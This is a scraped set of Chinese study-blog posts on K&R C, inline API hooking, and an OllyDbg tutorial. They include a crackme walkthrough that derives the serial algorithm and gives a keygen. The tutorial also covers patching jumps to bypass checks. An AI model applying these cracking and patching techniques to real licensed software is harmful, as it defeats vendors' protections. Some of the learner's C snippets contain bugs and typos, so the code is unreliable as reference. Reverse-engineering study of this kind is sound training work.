因为参数都是值传递的，所以在strcpy函数中可以以任何方式使用参数s和t； 然后我们实现strcmp strcmp的函数实现就是对比两个字符串中的数据是否一直 123456789101112131415161718192021222324252627282930313233int strcmp_cmp(char *t, char *s){ int i = 0; while (s[i] == t[i] != '\\0') { i++; if (t[i] == '\\0') //检查到最后一位 { return 0; } //如果跳出了这层循环，证明已经不当等了，就拿当前i对应的值做比较 } if (s[i] &gt; t[i]) { return 1; } else { return -1; } }int main(){ char a[] = &quot;iamstudent&quot;; char c[] = &quot;iamteacher!&quot;; int i; i = strcmp_cmp(a, c); printf(&quot;%d\\r\\n&quot;, i); system(&quot;pause&quot;);} 我对题目理解错了，修改后的程序 1234567891011121314151617181920212223242526int strcmp_cmp(char *t, char *s){ int i = 0; while (s[i] == t[i] != '\\0') { i++; if (t[i] == '\\0') //检查到最后一位 { return 0; } //如果跳出了这层循环，证明已经不当等了，就拿当前i对应的值做比较 } return s[i] - t[i];}int main(){ char a[] = &quot;iamstudent&quot;; char c[] = &quot;iamteacher!&quot;; int i; i = strcmp_cmp(a, c); printf(&quot;%d\\r\\n&quot;, i); system(&quot;pause&quot;);} 进出栈标准用法*p++ = val //将val压入栈 val = *–p //将栈顶元素弹出到val中 指针数据以及指向指针的指针函数的运行速度vs2013中看不出来 这道题也不是很会 多维数组前面我们说过了一维数组，但是也可以有二维数组，甚至多维数组，比如打游戏的时候的地图，就是三维数组。 判断年份的问题： 1234567891011121314151617181920212223242526272829303132333435#include &lt;stdio.h&gt;static char daytab[2][13] = { { 0, 31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31 }, //非闰年 { 0, 31, 29, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31 } //闰年};int day_of_year(int year, int month, int day){ int i, leap; leap = year % 4 == 0 &amp;&amp; year % 100 != 0 || year % 400 == 0; //判断是否闰年 for (i = 1; i &lt; month; i++) day += daytab[leap][i]; //循环加，加到传递的月份，然后计算 return day;}void month_day(int year, int yearday, int *pmonth, int *pday){ int i, leap; leap = year % 4 == 0 &amp;&amp; year % 100 != 0 || year % 400 == 0; for (i = 1; yearday &gt; daytab[leap][i]; i++) yearday -= daytab[leap][i]; *pmonth = i; *pday = yearday;}int main(){ int m, d; int i = day_of_year(2019, 6, 26); month_day(2019, 177, &amp;m, &amp;d); printf(&quot;%d\\r\\n&quot;, i); printf(&quot;月：%d日：%d\\r\\n&quot;, m, d); system(&quot;pause&quot;);} 指针数组的初始化12345678910char *month_name(int n){ static char *name[] = { &quot;zhangsan&quot;, &quot;lisi&quot;, &quot;wangmazi&quot;, }} 这个时候的name和上序的例子一样，是一个一维数组，数组的元素为字符指针。 指针与多维数组123int a[10][20]; //代表有200的intint *b[10]; //仅仅分配了10个指针，并且未初始化 指针数组的好处就是：数组的每一行长度可以不同，b的每个元素不必指向具有常量的具体个数。 12char *name = {&quot;zhang&quot;,&quot;wang&quot;,&quot;li&quot;,&quot;zhao&quot;}; 如果使用二维数组就是这样的 有没有发现，如果二维数组每一个元素都是同等大小的话，中间就不会有任何填充 命令行参数main函数一般有两个参数，第一个参数argc，一个argv argc用于参数计数，表示运行程序时命令行中参数数目； argv用于参数向量，是一个指向字符串数组的指针，其中每个字符串对应一个参数 通常使用多级指针处理这些字符串 按照c的约定，argv[0]的值是启动该程序的程序名，因此argc的值至少为1，如果argc的值为1，则说明程序名后面没有命令行参数。 12echo hello,world; 这一行中，argc的值为3，argv[0]、argv[1]、argv[1]的值分别为 argv[0] = echo argv[1] = hello, argv[2] = world 第一个可选参数为argv[1],最后一个可选参数为argv[argc-1]. 程序echo的第一个版本将argv看成一个字符指针数组 123456789101112131415#include &lt;stdio.h&gt;int main(int argc,char *argv[]) { //默认的默认的argc为1 int i; for(i=1;i&lt;argc;i++) //i=1；1不小于1，所以不执行，直接跳出循环 //这个程序中的argv为D { printf(&quot;%s%s&quot;,argv[i],(i&lt;argc-1)? &quot; &quot;: &quot; &quot;); } printf(&quot;\\n&quot;); return 0;} 这样就实现了一个echo，其实这个echo我也没懂，正常的逻辑应该进入程序，不满足条件，只打印一个换行 因为argv是一个指向指针的数组，所以可以通过指针而非数组下标的方式处理命令行参数。 12345678910#include &lt;stdio.h&gt;/* echo command-line arguments; 2nd version */main(int argc, char *argv[]){while (--argc &gt; 0)printf(&quot;%s%s&quot;, *++argv, (argc &gt; 1) ? &quot; &quot; : &quot;&quot;);printf(&quot;\\n&quot;);return 0;} argv是一个指向参数字符串数组起始的指针，所以自增运算（++argv）将使得它在最开始指向argv[1]而非argv[0]。每一次执行自增运算，就使得argv指向下一个参数，*argv就是指向那个参数的指针。 printf的格式化参数也可以是表达式 指向函数的指针在c语言中，函数本身不是变量，但是可以定义指向函数的指针，这种函数的指针可以被赋值、存放在数组中、传递给函数以及作为函数的返回值等等","link":"/2019/05/17/c%E8%AF%AD%E8%A8%80%E7%AC%AC%E4%BA%94%E7%AB%A0/"},{"title":"c语言第六章","text":"结构体、结构与函数、结构数组、指向结构的指针、类型定义、联合、位字段 结构体结构体是一个或多个变量的集合，这些变量可以是不同的类型 结构体可以拷贝、赋值、传递给参数，函数也可以返回结构类型的返回值 基本知识123456struct point { int x; int y;} 关键字struct引入结构声明，结构声明由包含在花括号中的一些列声明组成 结构中的变量称为成员。 如果结构声明的后面不带变量表，则不需要为它分配存储空间 结构也可以嵌套结构结构，使用点点出来 结构与函数结构的操作方法： 作为一个整体复制和赋值，通过&amp;运算符取地址，访问其成员 可以用一个常量成员值列表初始化结构，自动结构也通过赋值进行初始化 传递各个结构成员12345678struct point makeint(int x,int y){ struct point temp; temp.x = x; temp.y = y; return temp;} 参数名和结构成员同名不会引起冲突 123456789101112131415struct rect screen;struct point middle;struct point makepoint(int,int);screent.pt1 = makepoint(0,0);screent.pt2 = makepoint(xmax,ymax);middle = makepoint((screen.pt1.x+screen.pt2.x)/2,screen.pt1.y+screen.pt2.y)/2);struct addpoint(struct point p1,struct point p2){ p1.x += p2.x; p2.y += p2.y; return p1;} 函数的参数和返回值都是结构类型 结构数组123456struct student{ int age; char *name;}keytab[NKEYS]; 这样的多个变量共同构成一个数组 123456789101112131415161718192021222324252627282930#include &lt;stdio.h&gt;#define NKEYS 10000struct student{ int age; char *name;}keytab[] = { 18, &quot;张三&quot;, 19, &quot;李四&quot;, 20, &quot;王麻子&quot;, 21, &quot;张瑞&quot;};struct student1{ int age; char *name;}stu1;int main(){ stu1.age = 18; printf(&quot;%d\\r\\n&quot;, stu1.age); printf(&quot;%s\\r\\n&quot;, keytab[1].name); system(&quot;pause&quot;);} 条件编译语句if不能使用sizeof 指向结构的指针123456789101112131415161718192021222324252627282930313233343536373839#include &lt;stdio.h&gt;#include &lt;ctype.h&gt;#include &lt;string.h&gt;#define MAXWORD 100int getword(char *, int);struct key *binsearch(char *, struct key *, int);/* count C keywords; pointer version */main(){ char word[MAXWORD]; struct key *p; while (getword(word, MAXWORD) != EOF) if (isalpha(word[0])) if ((p = binsearch(word, keytab, NKEYS)) != NULL) p-&gt;count++; for (p = keytab; p &lt; keytab + NKEYS; p++) if (p-&gt;count &gt; 0) printf(&quot;%4d %s\\n&quot;, p-&gt;count, p-&gt;word); return 0;}/* binsearch: find word in tab[0]...tab[n-1] */struct key *binsearch(char *word, struck key *tab, int n){ int cond; struct key *low = &amp;tab[0]; struct key *high = &amp;tab[n]; struct key *mid; while (low &lt; high) { mid = low + (high - low) / 2; if ((cond = strcmp(word, mid-&gt;word)) &lt; 0) high = mid; else if (cond &gt; 0) low = mid + 1; else return mid; } return NULL;} 结构体的大小是需要对齐的，按照数据类型最长的那个类型对齐 类型定义typedef，它用来定义新的数据类型名 typedef int Length; 将Length定义与int具有同等意义的名字 现在可以使用Length来声明一个变量 Length a = 3; 它的相同意义就是 int a = 3; 联合union中可以定义多个成员，union的大小由最大的成员的大小决定 union成员共享同一块大小的内存，一次只能使用其中的一个成员 对union某一个成员赋值，会覆盖其他成员的值（但前提是成员所占字节数相同，当成员所占字节数不同时只会覆盖相应字节上的值，比如对char成员赋值就不会把整个int成员覆盖掉，因为char只占一个字节，而int占四个字节）；union量的存放顺序是所有成员都从低地址开始存放的 1234567891011121314151617181920212223242526272829303132333435363738394041#include &lt;stdio.h&gt;union data{ int n; char ch; short m;};int main(){ union data a; printf(&quot;%d, %d\\n&quot;, sizeof(a), sizeof(union data)); a.n = 0x40; printf(&quot;%X, %c, %hX\\n&quot;, a.n, a.ch, a.m); a.ch = '9'; printf(&quot;%X, %c, %hX\\n&quot;, a.n, a.ch, a.m); a.m = 0x2059; printf(&quot;%X, %c, %hX\\n&quot;, a.n, a.ch, a.m); a.n = 0x3E25AD54; printf(&quot;%X, %c, %hX\\n&quot;, a.n, a.ch, a.m); return 0;} 位字段12345678#include &lt;stdio.h&gt;struct { unsigned int is_keyword : 1; unsigned int is_extern : 1; unsigned int is_static : 1; }flag; 冒号后表示宽度，二进制数表示","link":"/2019/08/22/c%E8%AF%AD%E8%A8%80%E7%AC%AC%E5%85%AD%E7%AB%A0/"},{"title":"C语言第四章","text":"函数与程序结构、函数的基本知识、返回非整形值的函数 函数与程序结构函数可以把大的计算任务分解成若干个较小的任务。 函数的基本知识函数的定义声明如下： 返回值类型 函数名 (参数声明表) { ​ 声明和语句 } 程序可以堪称是变量定义和函数定义的集合。 被调用函数通过return语句想调用者返回值。 返回非整形值的函数如果返回值的类型为double或者float，我们通过atof函数来说明函数返回非整型值的办法。 1234567891011121314#include &lt;stdio.h&gt;#define MAXLINE 100main(){ double sum, atof(char[]); char line[MAXLINE]; int getline(char line[], int max); sum = 0; while (getline(line, MAXLINE) &gt; 0) printf(&quot;\\t%g\\n&quot;, sum += atof(line)); return 0;} 其中，声明语句 1double sum,atof(char []); 表明sum是一个double类型的变量，atof函数带有个char[]类型的参数，且返回一个double类型的值","link":"/2019/05/16/c%E8%AF%AD%E8%A8%80%E7%AC%AC%E5%9B%9B%E7%AB%A0/"},{"title":"内联钩子","text":"钩子可以广泛用于输入监控、API拦截、消息捕获等方面，一些杀毒软件会钩一些API函数，病毒使用钩子会捕获键盘得输入记录从而盗号，这些都属于HOOK得范围。 Inline HookInline Hook原理API函数保存在操作系统提供得DLL中，在程序中使用某个API得时候，在运行程序以后，程序会隐式得将API所在得DLL加载进入进程。 API函数也是由编译而成得，也由其相对应得二进制代码，既然是代码，那么就可以修改，通过一些“野蛮”得方式来修改API函数在内存得映像，从而对API函数进行HOOK。在汇编中，我们前面学习得方法，可以将je修改为jne，从而实现对程序流程得修改。 假设我们现在需要对进程得Kernel32.dll得CreateFile()函数进行HOOK，那么我们需要在进程得内存中找到CreateFile()得函数地址，然后修改CreateFile()函数得首地址得代码为jmp myProc得指令，这样我们调用CreateFile()函数得时候，就首先会跳转到我们得函数流程中去执行，这样就完成了HOOK，如图5-2 Inline HooK得实现对于代码来说，都是CPU可以用来执行得机器码，机器码和汇编指令是一一对应得，Inline Hook是在程序中嵌入了jmp指令然后跳转到我们得程序流程中继续执行得，jmp指令得用法是jmp 目的地址，jmp在汇编中是无条件跳转，我们可以随意打开一个程序，来尝试。 jmp后的偏移量 = 目的地址 - 源地址 - 5 梳理一下我们内联钩子的流程： 构造跳转指令 在内存中找到想要HOOK的函数地址，并保存为HOOK位置处的前5个字节 将构造的跳转指令写入需要HOOK的位置 当HOOK位置被执行时会跳转到我们的执行流程 如果要继续原来的流程，那么取消HOOK，也就是还原被修改的字节 执行原来的流程 继续HOOK住原来的位置","link":"/2019/10/11/%E5%86%85%E8%81%94%E9%92%A9%E5%AD%90/"},{"title":"加密与解密-TraceMes","text":"一步步尝试将160个CrackMe全部破解，如果可以，通过任何方式写出一个类似于注册机的东西。 环境WinXP Sp3 + 52Pojie六周年OllyDbg + PEID(0.95) 软件下载地址：https://github.com/sYstemk1t/Code-collection/tree/master/CrackMe/%E7%9C%8B%E9%9B%AATraceMe 程序分析 想要破解一个程序，必须先了解这个程序。所以，在破解过程中，对最初程序的分析很重要，他可以帮助我们理解作者的目的和意图，特别是对于注册码的处理细节，从而方便我们反向跟踪和推导。 打开加密与解密的光盘，找到chap02-&gt;2.1OllyDBg调试器-&gt;基本操作-&gt;ASCII版，将这个文件放入我们准备好的目录中，不推荐直接在桌面运行。 首先我们发现这个软件只有一部分，我们直接开始随意输入一个用户名和序列号(伪码)。 伪码： 用户名：CrackMe 序列号(Serial)：0000 点击Check，会弹出一个对话框提示：序列号错误，再来一次，再随意多输入几个试试，发现它还会对用户名的长度进行检验，如果用户名少于4个字符，则弹出”你输入的字符要大于4个”； OK，出现了对话框这个会对整个分析过程减少很多难度，说明作者再校验注册码之后发现如果用户名少于4个字符或者序列号不对就直接弹框，我们只要找到弹框的地方，向上跟踪即可。 具体分析步骤首先我们查看获取文本框中的字符，通常使用的API是GetDlgItemText或GetWindowText函数，也可以发送消息直接获取文本框中的文本。 因为是32位的ASCII码的程序，所以我们需要在这些API函数后加A，如果是Unicode的，需要加W 接下来我们给这个API函数下断点。 OllyDbg对API函数大小写敏感，输入函数名的时候大小写必须正确 还有另外一种我们查看函数调用地址，在反汇编窗口中单击，在弹出的快捷菜单中选择”查找当前模块名称”，或者按”Ctrl+n”快捷键。获取TraceMe使用的API名称列表。 然后使用程序运行起来，我们输入我们的伪码，查看断点处 查看这个地址，这个地址这么大，显然不是我们要找的函数，这个地址应该是系统的DLL所在的地址，然后我们Alt+F9回到程序领空。 1234567891011121314004011AE . 6A 51 push 0x51 ; /Count = 51 (81.)004011B0 . 50 push eax ; |Buffer = 00000007004011B1 . 6A 6E push 0x6E ; |ControlID = 6E (110.)004011B3 . 56 push esi ; |hWnd = 000B0062 ('TraceMe 动态分析技术',class='#32770')004011B4 . FFD7 call edi ; \\GetDlgItemTextA004011B6 . 8D8C24 9C0000&gt;lea ecx,dword ptr ss:[esp+0x9C]004011BD . 6A 65 push 0x65 ; /Count = 65 (101.)004011BF . 51 push ecx ; |Buffer = user32.77D3F88F004011C0 . 68 E8030000 push 0x3E8 ; |ControlID = 3E8 (1000.)004011C5 . 56 push esi ; |hWnd = 000B0062 ('TraceMe 动态分析技术',class='#32770')004011C6 . 8BD8 mov ebx,eax ; |004011C8 . FFD7 call edi ; \\GetDlgItemTextA 我们查看一下GetDlgItemTextA函数的参数 123456UINT GetDlgItemTextA( HWND hDlg, //空间的对话框的句柄 int nIDDlgItem, //要检索标题或文本的控件的标识符 LPSTR lpString, //接受文本标题的缓冲区 int cchMax //要复制到lpString指向的缓冲区的字符串的最大长度（以字符为单位）); 返回值：如果返回成功的话就返回文本长度，如果失败则返回0. 结合汇编指令改写C代码： 123456789;len = GetDlgItemTextA(hDlg,IDC_TET0,sizeof(cName)/sizeof(TCHAR)+1)004011AE . 6A 51 push 0x51 ; 最大字符数004011B0 . 50 push eax ; 文本缓冲区指针|Buffer = 00000007004011B1 . 6A 6E push 0x6E ; 空间标识|ControlID = 6E (110.)004011B3 . 56 push esi ; 对话框句柄|hWnd = 000B0062 ('TraceMe 动态分析技术',class='#32770')004011B4 . FFD7 call edi ; 调用GetDlgItemTextA，取用户名004011B6 . 8D8C24 9C0000&gt;lea ecx,dword ptr ss:[esp+0x9C] ;上一句执行以后，将用户名长度返回到eax中 123456789;GetDlgItemTextA(hDlg,IDC_TXT1,cCode,sizeof(cCode)/sizeof(TCHAR)+1)004011BD . 6A 65 push 0x65 ; /Count = 65 (101.)004011BF . 51 push ecx ; |Buffer = 0012FA20004011C0 . 68 E8030000 push 0x3E8 ; |ControlID = 3E8 (1000.)004011C5 . 56 push esi ; |hWnd = 000B0062 ('TraceMe 动态分析技术',class='#32770')004011C6 . 8BD8 mov ebx,eax ; |004011C8 . FFD7 call edi ; \\GetDlgItemTextA 12345678if(cName[0]==0 || len&lt; 5)004011CA . 8A4424 4C mov al,byte ptr ss:[esp+0x4C] ;将用户名的第一个字节传递给al004011CE . 84C0 test al,al ;检查有没有输入用户名004011D0 74 76 je short TraceMe.00401248 ;如果没有输入则跳转004011D2 . 83FB 05 cmp ebx,0x5 ;检查用户名的长度，是否小于5个字节004011D5 . 7C 71 jl short TraceMe.00401248 12345678910111213;GenRegCode(cCode,cName,len) GenRegCode采用C调用约定004011D7 . 8D5424 4C lea edx,dword ptr ss:[esp+0x4C] ;将用户名放入edx中004011DB . 53 push ebx ;将用户名压入栈中004011DC . 8D8424 A00000&gt;lea eax,dword ptr ss:[esp+0xA0] ;将序列号放入eax中004011E3 . 52 push edx ;用户名入栈004011E4 . 50 push eax ;序列号入栈004011E5 . E8 56010000 call TraceMe.00401340 ;调用GenRegCode函数004011EA . 8B3D BC404000 mov edi,dword ptr ds:[&lt;&amp;USER32.GetDlgIte&gt;; user32.GetDlgItem004011F0 . 83C4 0C add esp,0xC ;平衡堆栈004011F3 . 85C0 test eax,eax ;eax=0标识注册失败，eax=1标识注册成功004011F5 74 37 je short TraceMe.0040122E API函数大多采用__stdcall调用约定，即函数入口参数按从右往左的方式入栈，由被调用者清空栈中的参数，返回值存放在eax寄存器中 C代码中的子程序采用的C调用约定 获取输入的API函数执行后，会把取出的文本放到由lpString指向的位置。 算法分析12345004011DB . 53 push ebx //int len004011DC . 8D8424 A00000&gt;lea eax,dword ptr ss:[esp+0xA0] //004011E3 . 52 push edx //TCHAR *name004011E4 . 50 push eax //TCHAR *rCode004011E5 . E8 56010000 call TraceMe.00401340 //GenRegCode 程序使用esp来访问各个参数，利用ebp来处理字符串name[i] 12345600401340 /$ 55 push ebp ;ebp入栈，保护栈00401341 |. 8B6C24 0C mov ebp,dword ptr ss:[esp+0xC] ;将参数从栈中传递给ebp(用户名cName指针)00401345 |. 56 push esi ;esi入栈，保护栈00401346 |. 57 push edi ;user32.GetDlgItemTextA edi入栈 12345678;for(i=3;i&lt;len;i++,j++)00401347 |. 8B7C24 18 mov edi,dword ptr ss:[esp+0x18] ; TraceMe.004010D0 将参数从栈中传递给edi(len参数的值)0040134B |. B9 03000000 mov ecx,0x3 ;i=3，ecx作为变量i使用00401350 |. 33F6 xor esi,esi ;code=000401352 |. 33C0 xor eax,eax ;j=0，eax作为变量j使用00401354 |. 3BF9 cmp edi,ecx ; user32.77D3F88F i小于len嘛？00401356 |. 7E 21 jle short TraceMe.00401379 ;小于则跳转00401358 |. 53 push ebx 1234;if(j&gt;7) j=000401359 |&gt; /83F8 07 /cmp eax,0x7 ;j大于7嘛？0040135C |. |7E 02 |jle short TraceMe.00401360 ;0040135E |. |33C0 |xor eax,eax ;j=0 123456789101112;code+=(BYTE)name[i]*Table[j]00401360 |&gt; \\33D2 |xor edx,edx ;将edx的值清零00401362 |. 33DB |xor ebx,ebx ;00401364 |. 8A1429 |mov dl,byte ptr ds:[ecx+ebp] ;name[i]00401367 |. 8A98 30504000 |mov bl,byte ptr ds:[eax+0x405030] ;Table[j]，405030存放的是地址表0040136D |. 0FAFD3 |imul edx,ebx ;edx=name[i]*Table[j]00401370 |. 03F2 |add esi,edx ;code+=edx00401372 |. 41 |inc ecx ; user32.77D3F88F i++00401373 |. 40 |inc eax ;j++00401374 |. 3BCF |cmp ecx,edi ; user32.GetDlgItemTextA i是否小于len00401376 |.^ 7C E1 \\jl short TraceMe.00401359 ;如果小于，则循环，计算下一位 00401378 |. 5B pop ebx ; TraceMe.004011EA ;ebx出栈 123456789101112131415161718192021;wsprintf(name,TEXT(&quot;%Id&quot;),code)00401379 |&gt; \\56 push esi ; /&lt;%ld&gt; = 40234 (262708.) ;code0040137A |. 68 78504000 push TraceMe.00405078 ; |%ld 0040137F |. 55 push ebp ; |s = ;name 0012FAAC00401380 |. FF15 9C404000 call dword ptr ds:[&lt;&amp;USER32.wsprintfA&gt;] ; \\wsprintfA //wsprintfA函数将数字转换成字符00401386 |. 8B4424 1C mov eax,dword ptr ss:[esp+0x1C] ;将参数从堆中传给eax(序列号cCode指针)0040138A |. 83C4 0C add esp,0xC ;wsprintf是唯一需要手动平衡栈的API函数0040138D |. 55 push ebp ; /String2 = &quot;\u0018?&quot; //ebp指向计算出来的真正的序列号0040138E |. 50 push eax ; |String1 = &quot;0000&quot; //eax指向输入的序列号0040138F |. FF15 04404000 call dword ptr ds:[&lt;&amp;KERNEL32.lstrcmpA&gt;] ; \\lstrcmpA //lstrcmp函数比较字符00401395 |. F7D8 neg eax //如果相等，则eax=000401397 |. 1BC0 sbb eax,eax //00401399 |. 5F pop edi //edi出栈 ; TraceMe.004011EA0040139A |. 5E pop esi // ; TraceMe.004011EA0040139B |. 40 inc eax //eax+1，即序列号相等，eax=1，eax=00040139C |. 5D pop ebp ; TraceMe.004011EA0040139D \\. C3 retn ltrcmp 1234int lstrcmpA( LPCSTR lpString1, //计算出来的序列号 LPCSTR lpString2 //输入的序列号); 注册机1234567891011121314151617181920212223242526272829303132333435363738394041424344454647// TreacMe.cpp : 定义控制台应用程序的入口点。//#include &quot;stdafx.h&quot;#include &lt;string.h&gt;//char name[65] = &quot;CrackMe&quot;;char name[65];char table[8] = { 0xC ,0xA ,0x13 ,0x09 ,0x0C ,0x0B ,0x0A ,0x08 };int main(){ printf(&quot; 输入key：\\n &quot;); scanf_s(&quot;%s&quot;,name,65); //会用到一个固定地址的值 //会用到姓名里的后两位 //eax = i int user_len = strlen(name); int key_code= 0; //esi int count_ecx = 3; //esi int eax = 0; //eax for (; count_ecx&lt;user_len;) { if (eax&gt;7) eax = 0; int ebx = 0; int edx = 0; edx = name[count_ecx]; ebx = table[eax]; ebx = edx * ebx; key_code += ebx; count_ecx++; eax++; } printf(&quot;key_code: %d&quot;, key_code); return 0;}","link":"/2019/12/20/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86-TraceMe/"},{"title":"加密与解密-动态分析","text":"动态分析技术中最重要的是调试器，分为用户模式和内核模式。用户模式下的调试器是指用来调试用户模式程序的调试，工作在Ring3层，例如OllyDbg、x64dbg、Vistual C++等编译器自带的调试。内核调试器指的是可以调试操作系统内核的调试器，工作在Ring0层，如WIndbg OllyDbgOD可在当前各种版本的Windows上运行，但NT架构更能发挥OD的强大功能，它的反汇编引擎相当强大，可识别数千个C和Windows频繁使用的函数，并能将其标注出来。它会自动分析函数过程、循环语句、代码中的字符串等。 OD界面官网下载为一个压缩包，然后运行OllyDbg就可以。在Win7以上的操作系统中，需要将以管理员权限运行OllyDbg勾选。 反汇编面板反汇编面板窗口显示被调试程序得代码，有四列，分别是地址(Address)、十六进制机器码(Hex Dump)、反汇编代码(Disassembly)和注释(Comment)。 信息面板窗口在进行动态跟踪的时候，信息面板窗口将显示与指令相关的各寄存器的值、API函数调用提示和跳转信息等 数据面板窗口数据面板以十六进制和字符方式显示文件在内存中的数据。要显示指定内存地址的数据，可以右键-&gt;Go to experssion命令或者”Ctrl+G”快捷键； 寄存器面板窗口寄存器面板显示CPU各寄存器的值，支持浮点、MMX和3DNow！寄存器 栈面板窗口栈面板窗口显示栈的内容，即ESP指向地址的内容。将数据放入栈的操作称为入栈(push)，从栈中取出数据的操作称为出栈(pop)，栈窗口非常重要，各个API函数和子程序都利用它来传递参数和变量等 OllyDbg配置OllyDbg的配置在”Options”菜单中，有界面选项(Appearance)和调试选项(Debugging options)等。 界面设置单击”Options”-&gt;”Apperarance”选项，打开界面选项框，然后点击”Directories”(目录) 标签，设置UDD文件和插件的绝对路径. UDD文件为OllyDbg的工程文件。 插件用于扩充功能，路径设置正确后，将插件复制到”plugin”目录中，相应的选项就会在OllyDbg的主菜单”Plugin”里显示出来 调试设置默认即可 加载符号文件这个功能类似于IDA的FLIRT，使用符号库(lib)可以让OllyDBg以函数名的形式显示DLL中的函数。 关联到右键快捷菜单可以将OllyDbg关联到Windows资源管理器的邮件快捷菜单中。 Options -&gt; Add to Explorer -&gt; Add OllyDbg to Menu Windows Explorer 基本操作准备工作在分析Windows程序中，只要发现某个API函数被使用了，在接下来分分析过程就比较轻松了，因此，在分析一个程序时，以哪个函数API函数作为切入点就显得比较重要了。 一个验证函数正确与否的软件流程如下所示，我们将用户名与序列号输入到文本框，然后程序调用GetDlgItemTextA函数把字符读出，然后进行计算，最后用lstrcmp函数进行比较。 加载目标文件调试一般常用的调试方法中，将断点自动设置在”WinMain”处； 将程序载入OllyDbg，此时的OllyDbg会终端在TraceMe的第一条汇编指令处，调试器分析代码并等待用户下一步操作。此时，光标停在004013A0处，004013A0是程序的入口点。但是通过一些特殊的修改方式，有些程序可以在启动时不停在入口点，以达到反调试的目的。 单步跟踪F7 单步步进，遇到call指令跟进 F8 单步步过，遇到call路过，不跟进 Ctrl+F9 直到遇见ret指令时中断 Alt+F9 如果进入系统领空，此命令可瞬间回到应用程序领空 F9 运行程序 F2 断点 ​ 断点断点是可以让程序终端在制定的地方，从而方便的对其进行分析。 分析 要清楚各API函数的定义 API函数大多采用__stdcall调用约定，即函数入口参数按从右到左的顺序入栈，由被调用这情侣栈中的参数，返回值放在EAX寄存器中。因此，对于API函数，要分析其前面的push指令，这些指令将参数入栈，传给API调用 C代码中的子程序采用的是C约定，函数入口参数按从右到左的顺序入栈，由调用者清理栈中的参数 爆破找到关键跳转，然后将跳转改成不跳转，即可 在OllyDbg寄存器面板上单机寄存器ZF，双击1次即可取反。 在汇编指令处双击或者按空格，输入指令”nop”。这个机器是90 常用断点常用的断点有INT 3断点、硬件断点、内存断点、消息断点等。 INT 3断点这是一个常用的断点。在OllyDbg中可以使用bp命令或者”F2”来设置/取消断点。当执行一个INT 3断点时，该地址处的内容被调试器用INT 3指令替换了，此时OllyDbg将INT 3隐藏，显示出来的仍是中断前的指令。实际上，硬件断点处的”68”被替换成了”CC” 硬件断点硬件断点和DRx调试寄存器有关，在Intel CPU体系架构手册中可以看到关于对DRx调试寄存器的介绍： DRx调试寄存器共有8个，每个寄存器特征如下： DR0~DR3:调试地址寄存器，用于保存需要监视的地址，例如设置硬件断点 DR4~DR5:保留，未公开具体作用 FR6:调试寄存器组状态寄存器 DR7:调试寄存器组控制寄存器 硬件断点的原理是使用DR0、1、2、3设定地址，并使用DR7设定状态，因此最多设置四个硬件断点。硬件执行断点与CC断点的作用一样，但因为硬件执行断点不会将指令首字节修改为”CC”，所以更难检测。 内存断点OllyDbg可以设置内存访问断点或内存写入断点，原理是对所设的地址赋予不可访问/不可写入属性，这样当访问/写入的时候就会产生以尝。OllyDbg捕获异常后，比较异常地址是不是断点地址，如果是就中断，让用户继续操作。 硬件断点访问/写入断点是在触发硬件断点的下一条指令处下断，而内存断点是在触发断点的指令处下断 内存访问一次性断点Windows对内存使用段页式管理方式，在OllyDbg里按”Alt+M”快捷键显示内存，可以看到许多段，每个段都有不可访问、读、写、执行属性。在每个段中可以使用F2来对整个内存块设置该类断点。这个断点就是一次性断点，当所在段读取或执行完毕就会中断 消息断点Windows本身是由消息驱动的，如果调试时没有合适的断点，可以尝试使用消息断点。当某个特定窗口函数接受到某个特定消息时，消息断点即使程序中断。消息断点与INT 3断点的区别在于：INT 3断点可以在程序启动之前设置，消息断点只有在窗口被创建之后菜能被设置并拦截消息 条件断点在调试过程中，我们希望断点在满足一定的条件才会中断，这些断点称为条件断点。OllyDbg的条件断点可以按寄存器、存储器、消息等设置断点。 按寄存器条件中断快捷键为“Shift+F2”，输入条件表达式，bp为暂停 401476代表在这个地址下断点 eax == 0400000 1bp 401476 eax == 00400000 按存储器条件中断CreateFileA函数 123456789HANDLE CreateFileA( LPCSTR lpFileName, //指向文件名的指针 DWORD dwDesiredAccess, //访问模式 DWORD dwShareMode, //共享模式 LPSECURITY_ATTRIBUTES lpSecurityAttributes, //指向安全属性的指针 DWORD dwCreationDisposition, //如何创建文件 DWORD dwFlagsAndAttributes, //文件属性 HANDLE hTemplateFile //用于复制文件句柄); 运行实例，对CreateFileA函数设断点，然后查看栈内情况 插件MDebugWinDbgWinDbg是Windows平台上一款强大的用户态和内核态调试工具，是微软公司提供的免费调试器。WinDbg不仅可以调试应用程序，还可以完成内核调试、分析崩溃转储文件等工作。","link":"/2019/11/13/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86-%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90/"},{"title":"加密与解密-基础知识","text":"Windows下研究加密与解密技术，必须了解操作系统的一些基础知识，这样在分析过程中才可以有的放矢 基础静态分析技术所谓静态分析，是根据反汇编得到的程序指令进行分析，最常用的方法是根据提示信息入手进行分析。目前大多数软件在设计的时候都采用人机对话的方式。因此，阅读通过经挨反汇编得到的程序清单，通过包含提示信息的程序片段，就可以知道提前信息前后的程序片段所完成的功能，从而宏观的了解编程思路。常用软件用IDA等 动态分析技术虽然静态分析可以了解各个模块的功能，以及整个软件的编程思路，但是我们不能了解软件各个模块的技术细节，对于软件分析来说，静态分析是第一步，动态跟踪才是分析软件的关键。 许多软件在整体上完成的功能，一般要分解成若干个模块来实现，后一模块执行时要使用前一模块处理的结果。如果只对软件进行静态分析，一般是很难获得这些中间结果的。 许多软件在运行时，其最初执行的一段程序往往需要对后面的各个模块进行一些初始化的工作，并不依赖系统的重定位 许多加密程序为了阻止非法的跟中和阅读，对执行代码的大部分内容进行了加密替换，但只有最初的一段是铭文的，加密程序在运行时时会采用逐块加密、逐块执行的方法 对软件进行粗跟踪所谓粗跟踪，是指在跟踪时大块大块的跟踪，在遇到调用指令(call)、重复操作指令(REP)、循环操作指令(loop)等指令的时候一般不要跟踪，而要根据执行结果分析该程序的功能； 对关键部分进行跟踪在对软件进行一定程序的粗跟踪之后，就能获取程序中我们所关心的模块或程序段，这样就可以有针对该模块进行具体而详细。在一般情况下，我们可能要进行多次关键代码的跟踪菜能读懂程序。在每次跟踪时把比较关键的中间结果或指令记录一下，会对下一次分析有很大的帮助 文本字符计算机中存储的信息都是用二进制数值显示的，屏幕上显示的东西都是二进制数值转换之后的结果； 